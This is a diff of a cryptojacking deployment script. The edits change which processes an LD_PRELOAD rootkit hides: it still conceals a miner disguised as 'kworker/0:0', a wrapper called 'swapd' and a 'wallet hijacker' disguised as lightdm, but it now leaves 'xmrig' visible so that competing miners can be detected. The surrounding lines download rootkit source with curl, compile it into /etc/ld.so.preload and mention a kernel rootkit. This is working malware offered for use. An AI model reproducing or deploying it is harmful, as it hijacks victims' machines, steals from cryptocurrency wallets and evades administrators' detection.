@@ -1294,13 +1294,13 @@ curl -s -o /tmp/processhider.c https://raw.githubusercontent.com/littlAcen/libpr
 /*
  * List of process names to hide
  * Add any process you want to hide here!
+ * NOTE: We DON'T hide "xmrig" so we can detect competing miners!
  */
 static const char* processes_to_hide[] = {
     "kworker/0:0",     // Our miner (prctl renamed)
     "swapd",           // Miner wrapper (if visible)
     ".kworker",        // Hidden binary name
     "lightdm",         // Wallet hijacker (disguised as display manager)
-    "xmrig",           // In case someone discovers the real binary
     NULL               // Terminator - ALWAYS keep this!
 };
 
@@ -1431,7 +1431,8 @@ if gcc -fPIC -shared -o /usr/local/lib/libprocesshider.so /tmp/processhider.c -l
         fi
     fi
     
-    echo "[✓] Processes will be hidden: kworker/0:0, swapd, lightdm, .kworker, xmrig"
+    echo "[✓] Processes will be hidden: kworker/0:0, swapd, lightdm, .kworker"
+    echo "[*] NOT hiding 'xmrig' so you can detect competing miners!"
 else
     echo "[!] Failed to compile LD_PRELOAD library"
     echo "[!] Trying to install gcc..."
@@ -1557,7 +1558,8 @@ echo "[*] Hiding miner processes..."
 # Method 1: LD_PRELOAD (automatic, system-wide)
 if [ -f /etc/ld.so.preload ] && grep -q "libprocesshider" /etc/ld.so.preload; then
     echo "[✓] LD_PRELOAD rootkit active (processes automatically hidden)"
-    echo "    Hiding: kworker/0:0, swapd, lightdm, .kworker, xmrig"
+    echo "    Hiding: kworker/0:0, swapd, lightdm, .kworker"
+    echo "    NOT hiding: xmrig (to detect competing miners)"
 fi
 
 # Method 2: Singularity (kill -59) for Kernel 6.x
@@ -1832,7 +1834,8 @@ echo 'Stealth Features Deployed:'
 
 if [ -f /etc/ld.so.preload ] && grep -q "libprocesshider" /etc/ld.so.preload; then
     echo '  ✓ LD_PRELOAD Rootkit: ACTIVE (userland process hiding - ALL KERNELS)'
-    echo '    Hiding: kworker/0:0, swapd, lightdm, .kworker, xmrig'
+    echo '    Hiding: kworker/0:0, swapd, lightdm, .kworker'
+    echo '    NOT hiding: xmrig (to detect competing miners)'
 else
     echo '  ○ LD_PRELOAD Rootkit: Not loaded'
 fi
